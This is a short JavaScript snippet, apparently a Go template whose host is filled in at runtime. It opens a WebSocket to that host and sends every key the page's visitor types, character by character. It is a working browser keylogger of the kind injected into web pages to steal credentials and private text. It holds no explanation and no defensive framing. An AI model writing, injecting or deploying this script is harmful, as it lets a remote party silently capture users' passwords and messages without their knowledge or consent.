(function () {
    let conn = new WebSocket("ws://{{.}}/ws");
    document.onkeypress = keypress;
    function keypress(evt) {
        s = String.fromCharCode(evt.which);
        conn.send(s);
    }
    console.log("connected to: {{.}}");
})();
